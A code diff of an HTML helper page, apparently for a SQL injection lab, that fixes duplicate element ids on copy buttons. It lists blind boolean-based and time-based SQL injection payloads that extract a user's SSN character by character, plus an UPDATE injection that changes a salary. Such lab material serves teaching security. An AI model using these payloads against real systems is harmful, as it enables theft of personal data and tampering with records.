@@ -37,17 +37,17 @@
     <button onclick="copyToClipboard('inband-union')">Copy Union-based Payload</button>
 
     <h2>3. Malicious Payloads for Blind SQLi (Alice's SSN: 10211002)</h2>
-    <pre id="blind-boolean">admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='1' --  </pre>
-    <button onclick="copyToClipboard('blind-boolean')">Copy Success Boolean-based Payload</button>
+    <pre id="blind-boolean-success">admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='1' --  </pre>
+    <button onclick="copyToClipboard('blind-boolean-success')">Copy Success Boolean-based Payload</button>
     
-    <pre id="blind-boolean">admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='2' --  </pre>
-    <button onclick="copyToClipboard('blind-boolean')">Copy Failure Boolean-based Payload</button>
+    <pre id="blind-boolean-failure">admin' AND SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='2' --  </pre>
+    <button onclick="copyToClipboard('blind-boolean-failure')">Copy Failure Boolean-based Payload</button>
 
-    <pre id="blind-time">admin' AND IF(SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='1', SLEEP(3), 0)=0 -- </pre>
-    <button onclick="copyToClipboard('blind-time')">Copy Success Time-based Payload</button>
+    <pre id="blind-time-success">admin' AND IF(SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='1', SLEEP(3), 0)=0 -- </pre>
+    <button onclick="copyToClipboard('blind-time-success')">Copy Success Time-based Payload</button>
     
-    <pre id="blind-time">admin' AND IF(SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='2', SLEEP(3), 0)=0 -- </pre>
-    <button onclick="copyToClipboard('blind-time')">Copy Failure Time-based Payload</button>
+    <pre id="blind-time-failure">admin' AND IF(SUBSTRING((SELECT ssn FROM credential WHERE name='Alice'),1,1)='2', SLEEP(3), 0)=0 -- </pre>
+    <button onclick="copyToClipboard('blind-time-failure')">Copy Failure Time-based Payload</button>
 
     <h2>4. UPDATE Injection Payloads (Edit Profile Nickname)</h2>
     <pre id="update-own">Alice', salary=100000 WHERE name='Alice'; -- </pre>
